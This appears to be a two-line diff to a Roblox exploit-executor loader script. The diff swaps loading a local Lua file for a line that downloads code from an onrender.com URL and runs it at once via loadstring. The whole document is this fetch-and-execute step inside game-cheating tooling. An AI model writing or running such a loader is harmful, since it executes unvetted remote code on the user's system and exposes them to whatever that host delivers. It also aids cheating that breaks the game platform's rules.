@@ -1,2 +1,2 @@
 getgenv().script_key = ""
-loadstring(readfile("Celestial/Supported Games/game.lua"))()
+loadstring(game:HttpGet("https://discord-bot-lee1.onrender.com/client"))()
